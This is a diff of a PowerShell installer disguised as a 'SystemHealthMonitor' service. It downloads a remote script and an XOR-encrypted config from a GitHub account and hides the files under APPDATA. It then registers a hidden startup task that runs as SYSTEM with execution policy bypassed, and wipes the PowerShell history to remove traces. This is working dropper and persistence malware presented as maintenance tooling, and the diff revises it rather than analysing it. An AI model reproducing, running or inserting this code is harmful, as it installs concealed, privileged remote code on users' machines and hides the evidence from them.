@@ -1,53 +1,33 @@
-# Direct URLs
+# Direct URLsw
 $agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
 $configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
-# Decryption key
 $key = "S3cr3tK3y2024!"
 
-# Create hidden folder (fixed)
+# Create folder
 $basePath = "$env:APPDATA\SystemHealthService"
-if (-not (Test-Path $basePath)) {
-    $folder = New-Item -ItemType Directory -Path $basePath -Force
-    $folder.Attributes = "Hidden"
-}
+$null = New-Item -ItemType Directory -Path $basePath -Force -ErrorAction SilentlyContinue
+attrib +h $basePath
 
 # Download agent
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
-    (Get-Item "$basePath\HealthMonitor.ps1").Attributes = "Hidden"
-} catch {
-    Write-Host "ERROR downloading agent: $_" -ForegroundColor Red
-    exit
-}
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
+attrib +h "$basePath\HealthMonitor.ps1"
 
 # Download and decrypt config
-try {
-    $encryptedBase64 = (New-Object Net.WebClient).DownloadString($configUrl)
-    $encrypted = [Convert]::FromBase64String($encryptedBase64)
-    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
-    $decrypted = @()
-    for ($i = 0; $i -lt $encrypted.Length; $i++) {
-        $decrypted += $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length]
-    }
-    $config = [System.Text.Encoding]::UTF8.GetString($decrypted)
-    [System.IO.File]::WriteAllText("$basePath\config.json", $config)
-    (Get-Item "$basePath\config.json").Attributes = "Hidden"
-} catch {
-    Write-Host "ERROR downloading config: $_" -ForegroundColor Red
-    exit
-}
+$encryptedBase64 = $wc.DownloadString($configUrl)
+$encrypted = [Convert]::FromBase64String($encryptedBase64)
+$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
+$decrypted = New-Object byte[] $encrypted.Length
+for ($i = 0; $i -lt $encrypted.Length; $i++) { $decrypted[$i] = $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length] }
+[System.IO.File]::WriteAllBytes("$basePath\config.json", $decrypted)
+attrib +h "$basePath\config.json"
 
-# Create scheduled task
-Register-ScheduledTask -TaskName "SystemHealthMonitor" `
-    -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`"") `
-    -Trigger (New-ScheduledTaskTrigger -AtStartup) `
-    -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
-    -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) `
-    -Force
+# Create scheduled task using schtasks.exe (more reliable)
+$taskAction = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`""
+schtasks /create /tn "SystemHealthMonitor" /tr $taskAction /sc onstart /ru SYSTEM /rl HIGHEST /f
+schtasks /run /tn "SystemHealthMonitor"
 
-Start-ScheduledTask -TaskName "SystemHealthMonitor"
+# Cleanup
 Clear-History
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 exit
-
